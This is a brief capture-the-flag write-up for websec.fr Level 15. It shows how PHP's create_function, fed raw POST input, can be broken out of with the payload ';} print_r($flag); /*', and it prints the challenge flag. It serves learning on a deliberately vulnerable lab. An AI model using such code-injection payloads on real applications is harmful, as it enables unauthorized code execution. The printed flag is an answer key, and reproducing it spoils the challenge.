# Level 15

1. First, lets check out what is written in http://websec.fr/level15/source.php
2. Then we could find out a interesting function :
    ```
    $fun = create_function('$flag', $_POST['c']);
    ```
    Now, lets check out what does it work.
    ```
    create_function('$flag' , 'echo $flag');
    ```
    Equals to : 
    ```
    function Flag($flag) {
        echo $flag;
    }
    ```
3. So, all we have to do is to figure out commands that can pass the function  and get the flag. 
    ```
    ;} print_r($flag); /*
    ```
    Then we send it and get the flag. Of course, you can still use Python to get the flag.
4. Here is the flag : WEBSEC{HHVM_was_right_about_not_implementing_eval}
